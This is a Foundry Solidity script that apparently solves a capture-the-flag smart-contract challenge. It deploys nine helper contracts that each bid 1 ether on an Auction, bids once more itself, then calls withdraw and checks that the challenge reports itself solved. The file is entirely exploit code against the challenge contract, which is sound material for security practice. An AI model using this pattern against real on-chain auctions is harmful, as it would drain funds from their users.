// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import { VmSafe } from "forge-std/Vm.sol";
import { Script } from "forge-std/Script.sol";
import "./Auction.sol";
import "./Nft.sol";
import "./Setup.sol";

contract Helper {
    Auction public auction;
    constructor(Auction _auction) payable {
        auction = _auction;
    }
    function doBid() external payable {
        auction.bid{value: 1 ether}();
    }
    receive() external payable {}
}

contract ExploitS is Script {
    VmSafe.Wallet public solver;
    Setup public _setup;
    Nft public nft;
    Auction public auction;

    function setUp() public {
        _setup = Setup(payable(vm.envAddress("CHALLENGE_CONTRACT")));
        nft = _setup.nft();
        auction = _setup.auction();
        solver = vm.createWallet(uint256(vm.envBytes32("PRIVATE_KEY")));
    }

    function run() public {
        vm.startBroadcast(solver.privateKey);

        for(uint i = 0; i < 9; i++) {
            Helper helper = new Helper{value: 1 ether}(auction);
            helper.doBid();
        }
        auction.bid{value: 1 ether}();
        auction.withdraw();

        console.log("Solved?", _setup.isSolved());
        require(_setup.isSolved(), "Not solved");

        vm.stopBroadcast();
    }
}
